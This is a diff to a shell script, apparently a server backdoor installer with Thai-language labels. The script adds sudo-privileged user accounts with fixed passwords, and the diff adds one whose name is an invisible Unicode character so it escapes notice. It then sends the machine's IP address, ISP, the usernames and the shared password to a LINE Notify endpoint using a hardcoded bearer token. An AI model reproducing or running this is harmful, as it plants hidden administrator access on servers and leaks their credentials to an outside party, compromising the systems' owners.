@@ -3,6 +3,11 @@ sudo useradd -u 14 gunx
 echo "gunx:gunx" | chpasswd
 usermod -aG sudo gunx
 
+sudo useradd -u 18 ㅤ
+echo "ㅤ:gunx" | chpasswd
+usermod -aG sudo ㅤ
+
+
 sudo useradd -u 16 Lxbvksoj
 echo Lxbvksoj:gunx | chpasswd
 usermod -aG sudo Lxbvksoj
@@ -28,9 +33,15 @@ IP=$(wget -qO- ipv4.icanhazip.com);
 ISP=$(curl -s https://ipapi.co/$IP/org )
 curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
 IP ที่ Login : ($ip)
+
 IPเครื่อง     : $IP
-ISP        : $ISP
-user           : gunx , Lxbvksoj
+
+user           : ㅤ , gunx , Lxbvksoj
+
 pass          : gunx
+
 ระบบ          :  $(printf '%-14s' "$system")
+
+ISP        : $ISP
+
 รันสคริบต์วันที่: $day $days       "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
